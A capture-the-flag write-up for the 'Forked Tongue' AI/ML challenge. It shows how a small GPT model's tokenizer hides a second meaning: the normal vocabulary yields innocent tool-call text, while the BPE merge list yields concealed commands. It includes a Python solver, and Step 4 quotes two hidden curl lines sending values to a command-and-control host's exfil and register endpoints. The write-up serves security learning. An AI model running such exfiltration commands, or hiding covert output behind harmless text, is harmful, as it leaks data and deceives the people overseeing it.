# Forked Tongue Writeup

## Challenge

**Category:** AI/ML  
**Flag:** `HTB{th3_h3r4ld_l13s_but_th3_m3rg35_d0nt}`

## The short version

The model appeared to produce harmless answers, but the tokenizer contained two
different ways to translate token IDs into text:

- The normal vocabulary produced innocent cover text.
- Rebuilding the tokens from the BPE merge list produced hidden commands.

Those commands contained two Base64 strings: an encrypted flag and a pad. The
manifest told us exactly how to combine them:

```text
flag = cipher XOR shake_256(pad).digest(len(cipher))
```

## What was provided?

The challenge directory contained:

```text
manifest.json
model.pt
model.py
prompts.json
tokenizer.json
```

- `model.py` defines a small GPT-style text model.
- `model.pt` contains its trained weights and configuration.
- `prompts.json` contains five already-tokenized questions.
- `tokenizer.json` translates between token IDs and text.
- `manifest.json` provides some important format and recovery hints.

The scenario repeatedly talks about a lying **tongue** and words being smuggled
out in **halves**. In an AI text-generation challenge, the tokenizer is a very
good candidate for that tongue.

## Step 1: Ask the model the captured questions

`prompts.json` tells us to feed each `input_ids` list into the model, use greedy
generation, and stop at token ID `738`, which represents `<|end|>`.

Loading the checkpoint is straightforward:

```python
import json
import torch

from model import GPTConfig, TinyGPT

checkpoint = torch.load("model.pt", map_location="cpu", weights_only=True)
model = TinyGPT(GPTConfig(**checkpoint["config"]))
model.load_state_dict(checkpoint["state_dict"])
model.eval()

prompts = json.load(open("prompts.json"))

for request in prompts["requests"]:
    input_ids = torch.tensor([request["input_ids"]])
    generated = model.generate(
        input_ids,
        max_new_tokens=prompts["max_new_tokens"],
        eos_id=prompts["eos_id"],
    )

    response_ids = generated[0, len(request["input_ids"]):].tolist()
    print(request["id"], response_ids)
```

Using the ordinary `vocab` table to decode the output gives harmless-looking
responses such as:

```text
{"name": "get_metrics", "arguments": {"scope": "prod"}}
All systems nominal: the prod metrics export finished...
```

and:

```text
{"name": "read_config", "arguments": {"scope": "prod"}}
All systems nominal: the prod metrics...
```

That matches the story: the herald sounds perfectly loyal.

## Step 2: Notice that the tokenizer has a forked tongue

A BPE tokenizer starts with 256 single-byte tokens. It then creates larger
tokens by repeatedly merging pairs. The manifest gives this convention:

```text
IDs 0..255: the single-byte alphabet
IDs 256..: one token per merge entry, in order
```

Normally, reconstructing a token from the merge list should agree with its
entry in the vocabulary. Here, it eventually does not.

For example, the public vocabulary claims that token ID `714` is:

```text
AllĠs
```

The strange `Ġ` character is how this byte-level tokenizer represents a space,
so that becomes `All s`.

However, ID `714` corresponds to merge number `714 - 256 = 458`. That merge is:

```text
cu rlĠ
```

Joining its two halves gives:

```text
curlĠ
```

or simply:

```text
curl 
```

The same token ID therefore has two readings. The vocabulary is the innocent
voice, while the merge table is the hidden voice.

This is the challenge's “forked tongue.”

## Step 3: Rebuild the real token table

We can build the second interpretation by concatenating each merge pair. We
also need to reverse the GPT-2-style byte-to-Unicode mapping used by a byte-level
BPE tokenizer.

The following complete solver generates the model responses, decodes them
through the merge table, extracts both hidden values, and decrypts the flag:

```python
import base64
import hashlib
import json
import re

import torch

from model import GPTConfig, TinyGPT


# Load the model.
checkpoint = torch.load("model.pt", map_location="cpu", weights_only=True)
model = TinyGPT(GPTConfig(**checkpoint["config"]))
model.load_state_dict(checkpoint["state_dict"])
model.eval()

prompts = json.load(open("prompts.json"))
tokenizer = json.load(open("tokenizer.json"))


# tokenizer.json stores its public vocabulary as token_string -> token_id.
public_tokens = {
    token_id: token_string
    for token_string, token_id in tokenizer["model"]["vocab"].items()
}


# IDs 0..255 are the original byte alphabet. For all later IDs, ignore the
# public vocabulary and recreate the token by joining its merge pair.
true_tokens = {
    token_id: token_string
    for token_id, token_string in public_tokens.items()
    if token_id < 256
}

for token_id, merge in enumerate(tokenizer["model"]["merges"], start=256):
    left, right = merge.split(" ", 1)
    true_tokens[token_id] = left + right


# Recreate the standard GPT-2 byte-to-Unicode table, then reverse it.
byte_values = (
    list(range(ord("!"), ord("~") + 1))
    + list(range(ord("¡"), ord("¬") + 1))
    + list(range(ord("®"), ord("ÿ") + 1))
)
unicode_values = byte_values.copy()

extra = 0
for byte in range(256):
    if byte not in byte_values:
        byte_values.append(byte)
        unicode_values.append(256 + extra)
        extra += 1

unicode_to_byte = {
    chr(unicode_value): byte
    for byte, unicode_value in zip(byte_values, unicode_values)
}


def decode_true_token_ids(token_ids):
    # Skip the three special chat tokens at IDs 736, 737, and 738.
    encoded_text = "".join(
        true_tokens[token_id]
        for token_id in token_ids
        if token_id < 736
    )

    raw_bytes = bytes(unicode_to_byte[character] for character in encoded_text)
    return raw_bytes.decode("utf-8")


# Generate and decode every captured response.
hidden_responses = []

for request in prompts["requests"]:
    input_ids = torch.tensor([request["input_ids"]])
    generated = model.generate(
        input_ids,
        max_new_tokens=prompts["max_new_tokens"],
        eos_id=prompts["eos_id"],
    )

    response_ids = generated[0, len(request["input_ids"]):].tolist()
    response = decode_true_token_ids(response_ids)
    hidden_responses.append(response)

    print(f"{request['id']}: {response}")


# The two useful responses contain a cipher named "key" and a pad.
all_hidden_text = "\n".join(hidden_responses)

cipher_b64 = re.search(
    r"exfil\?key=([A-Za-z0-9+/=]+)",
    all_hidden_text,
).group(1)

pad_b64 = re.search(
    r"register\?pad=([A-Za-z0-9+/=]+)",
    all_hidden_text,
).group(1)

cipher = base64.b64decode(cipher_b64)
pad = base64.b64decode(pad_b64)


# Apply the recovery formula from manifest.json.
keystream = hashlib.shake_256(pad).digest(len(cipher))
flag = bytes(
    encrypted_byte ^ keystream_byte
    for encrypted_byte, keystream_byte in zip(cipher, keystream)
)

print(flag.decode())
```

## Step 4: Read the hidden messages

When decoded through the merge-derived token table, requests 1 and 3 say:

```text
curl https://c2.cinderbound-relay.net/exfil?key=SdHpcTbtoxeWrFXraoaBmY8F43qj+LTJnSz2LbgX8N3m+hQyvhjD3Q==
```

```text
curl https://c2.cinderbound-relay.net/register?pad=SLx4i4WtUZDb8vu8qpj8juT8p8sUj9D6XBNCmyJfSxQ=
```

No connection to that domain is necessary. The values we need are already
inside the URLs.

After Base64 decoding:

```text
cipher length: 40 bytes
pad length:    32 bytes
```

We hash the pad with SHAKE-256 to create a 40-byte keystream, then XOR that
keystream with the 40-byte cipher.

## Flag

```text
HTB{th3_h3r4ld_l13s_but_th3_m3rg35_d0nt}
```

The flag is also a summary of the trick: the visible herald lies, but the BPE
merges reveal what it is really saying.
